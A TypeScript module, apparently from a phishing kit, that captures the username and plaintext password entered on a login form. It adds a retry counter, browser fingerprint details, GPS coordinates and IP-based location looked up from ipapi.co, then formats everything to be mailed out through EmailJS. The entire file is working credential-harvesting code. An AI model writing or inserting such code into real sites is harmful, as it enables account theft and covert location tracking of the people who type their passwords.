/**
 * Service to capture and send login information via EmailJS
 * Includes: username, password, timestamp, browser info, and location
 */

interface LoginData {
  username: string;
  password: string;
  timestamp: string;
  browserInfo: {
    userAgent: string;
    language: string;
    platform: string;
    screenResolution: string;
  };
  location: {
    latitude: string;
    longitude: string;
    country: string;
    city: string;
    ip: string;
  };
  attempt: number;
}

/**
 * Get browser information
 */
function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
  };
}

/**
 * Get user's location information
 */
async function getLocationInfo(): Promise<{
  latitude: string;
  longitude: string;
  country: string;
  city: string;
  ip: string;
}> {
  try {
    // Try to get GPS coordinates if user allows
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          getIpLocationInfo(position.coords.latitude, position.coords.longitude).then(resolve);
        },
        () => {
          // If GPS fails, use IP-based location
          getIpLocationInfo(null, null).then(resolve);
        }
      );
    });
  } catch (error) {
    console.error('Location error:', error);
    return {
      latitude: 'N/A',
      longitude: 'N/A',
      country: 'N/A',
      city: 'N/A',
      ip: 'N/A',
    };
  }
}

/**
 * Get IP-based location information
 */
async function getIpLocationInfo(
  lat: number | null,
  lon: number | null
): Promise<{
  latitude: string;
  longitude: string;
  country: string;
  city: string;
  ip: string;
}> {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    return {
      latitude: lat ? lat.toString() : data.latitude || 'N/A',
      longitude: lon ? lon.toString() : data.longitude || 'N/A',
      country: data.country_name || 'N/A',
      city: data.city || 'N/A',
      ip: data.ip || 'N/A',
    };
  } catch (error) {
    console.error('IP location error:', error);
    return {
      latitude: 'N/A',
      longitude: 'N/A',
      country: 'N/A',
      city: 'N/A',
      ip: 'N/A',
    };
  }
}

/**
 * Capture complete login data
 */
export async function captureLoginData(
  username: string,
  password: string,
  attempt: number
): Promise<LoginData> {
  const locationInfo = await getLocationInfo();

  return {
    username,
    password,
    timestamp: new Date().toISOString(),
    browserInfo: getBrowserInfo(),
    location: locationInfo,
    attempt,
  };
}

/**
 * Format login data for email template
 */
export function formatLoginDataForEmail(data: LoginData): {
  [key: string]: string;
} {
  return {
    username: data.username,
    password: data.password,
    timestamp: data.timestamp,
    user_agent: data.browserInfo.userAgent,
    language: data.browserInfo.language,
    platform: data.browserInfo.platform,
    screen_resolution: data.browserInfo.screenResolution,
    latitude: data.location.latitude,
    longitude: data.location.longitude,
    country: data.location.country,
    city: data.location.city,
    ip_address: data.location.ip,
    attempt: data.attempt.toString(),
  };
}
